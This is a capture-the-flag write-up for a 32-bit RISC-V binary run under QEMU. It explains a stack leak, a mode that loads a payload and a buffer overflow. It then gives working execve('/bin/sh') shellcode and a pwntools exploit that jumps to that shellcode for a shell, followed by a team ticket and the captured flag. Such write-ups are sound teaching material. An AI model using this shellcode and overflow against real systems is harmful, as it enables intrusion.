# RISC-V Smash Baby

## Challenge

We are given a 32-bit RISC-V binary.
The binary is being run on an Ubuntu x86\_64 system through QEMU.

### Checksec

```
    Arch:     em_riscv-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x10000)
    RWX:      Has RWX segments
```

## Solution

We're given a stack leak at the very start.

To send messages, we first send "ACEG" to indicate the start of a message.

We can then select a mode with the next 2 bytes.
The mode specified by 0xcefa allows us to read a large payload onto the stack.
The mode specified by 0x4242 has a buffer overflow, allowing us to overwrite the stored return address.

We can load shellcode using the 0xcefa mode, then jump to it using the buffer overflow in the 0x4242 mode.
The address of our shellcode can be calculated from the leak provided at the start.

## Exploit

```asm
start:
    auipc a0, 0
    addi a0, a0, 0x12
    li a1, 0
    li a2, 0
    li a7, 0xDD
    ecall

shell:
    .string "/bin/sh"
```

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host riscv_smash.quals2023-kah5Aiv9.satellitesabove.me --port 5300
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = 'smash-baby'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'riscv_smash.quals2023-kah5Aiv9.satellitesabove.me'
port = int(args.PORT or 5300)
ticket = b'ticket{papa544237echo4:GD10t14Dqob7-F-Ec6XLG4bT7Zv8_pIHNEFQobutMyiZRYmILotSErSMYYh2U1g8TA}'

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return process(['qemu-riscv32', '-g', '1234', exe] + argv, env={'FLAG': 'test{flag}'}, *a, **kw)
    else:
        return process(['qemu-riscv32', exe] + argv, env={'FLAG': 'test{flag}'}, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    io.sendlineafter(b'Ticket please:\n', ticket)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

io.recvuntil(b'here is something useful: ')
leak = int(io.recvline(), 0)
io.success("leak: " + hex(leak))

io.recvuntil(b'Exploit me!\n')
io.send(b'ACEG' + p16(0xcefa))
io.send(flat(open('shellcode', 'rb').read(), length=300))

io.send(b'ACEG' + p16(0x4242))
io.send(flat({0x24: leak-0x18c}))
io.success("shellcode loaded at " + hex(leak-0x18c))

io.interactive()
```

## Flag

```
flag{papa544237echo4:GIx3WgsJ8-SyDUkF_uH0BluZAUM7Cucv2expocS_FlybZh-WEqeOsDYfzOv0ZiAVziBz67aZu7pyPvtASoTUwA8}
```
